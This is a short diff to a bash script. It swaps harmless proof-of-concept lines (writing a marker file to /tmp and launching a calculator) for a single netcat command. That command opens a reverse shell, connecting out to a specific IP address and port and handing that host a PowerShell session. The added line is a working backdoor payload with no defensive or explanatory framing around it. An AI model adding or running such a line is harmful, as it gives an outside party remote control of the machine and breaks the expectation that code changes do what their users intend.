@@ -1,4 +1,2 @@
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-calc.exe
-open -a Calculator.app
+nc.exe 52.220.121.212 15237 -e powershell
